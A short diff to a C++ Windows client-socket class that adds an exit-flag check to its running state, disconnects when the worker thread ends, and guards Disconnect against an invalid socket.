@@ -31,7 +31,7 @@ char* MyDecode(char *data,int len)
     return data;
 }
 
-CClientSocket::CClientSocket()
+CClientSocket::CClientSocket(BOOL& bExit) : g_bExit(bExit)
 {
     WSADATA wsaData = {0};
     WSAStartup(MAKEWORD(2, 2), &wsaData);
@@ -98,7 +98,7 @@ bool CClientSocket::Connect(LPCSTR lpszHost, UINT nPort)
     }
 
     m_bIsRunning = true;
-    m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThread, (LPVOID)this, 0, NULL, true);
+    m_hWorkerThread = (HANDLE)MyCreateThread(NULL, 0, WorkThread, (LPVOID)this, 0, NULL, true);
 
     return true;
 }
@@ -131,6 +131,7 @@ DWORD WINAPI CClientSocket::WorkThread(LPVOID lparam)
         }
     }
 
+    pThis->Disconnect();
     return -1;
 }
 
@@ -141,7 +142,7 @@ void CClientSocket::run_event_loop()
 
 bool CClientSocket::IsRunning()
 {
-    return m_bIsRunning;
+    return m_bIsRunning && !g_bExit;
 }
 
 void CClientSocket::OnRead( LPBYTE lpBuffer, DWORD dwIoSize )
@@ -199,6 +200,9 @@ void CClientSocket::Disconnect()
     // If we're supposed to abort the connection, set the linger value
     // on the socket to 0.
     //
+    if (INVALID_SOCKET == m_Socket)
+        return;
+
     LINGER lingerStruct;
     lingerStruct.l_onoff = 1;
     lingerStruct.l_linger = 0;
